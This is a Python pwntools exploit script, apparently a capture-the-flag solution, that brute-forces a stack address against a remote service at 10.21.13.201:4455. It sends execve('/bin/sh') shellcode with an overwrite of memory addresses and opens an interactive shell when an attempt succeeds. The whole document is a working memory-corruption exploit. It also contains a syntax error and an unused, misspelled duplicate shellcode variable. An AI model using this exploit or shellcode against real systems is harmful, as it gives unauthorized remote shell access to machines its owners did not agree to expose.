from pwn import *
#p=process("./1")
for x in range(0,0x2000,16):
	if(x==0x1270)
		continue;
	p=remote("10.21.13.201",4455)
	print p.recv();
	if False:
		gdb.attach(p,'''
		b *0x80488b8
		c
		''')
	p.sendline(p32(0xffffd200));
	p.recv();
	print hex(x) 
	shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
	shellocde="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
	tt=0xffffd270-0x1000+x
	p.sendline(shellcode.ljust(24,"A")+p32(0x804b04c)+p32(tt)+p32(0)+p32(tt+0x20))
	a=p.recv()
	try:
		print hex(u32(p.recv()[:4]))
		p.interactive()
	except EOFError:
		p.close()
